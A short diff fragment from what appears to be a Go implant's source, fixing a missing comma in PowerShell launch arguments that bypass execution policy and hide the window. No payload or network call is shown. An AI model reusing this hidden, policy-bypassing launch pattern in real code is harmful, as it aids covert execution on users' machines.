@@ -135,7 +135,7 @@ func tryImplant(conf *tls.Config) {
 			"-noprofile",
 			"-noninteractive",
 			"-executionpolicy", "bypass",
-			"-windowstyle", "hidden"
+			"-windowstyle", "hidden",
 		)
 	}
 
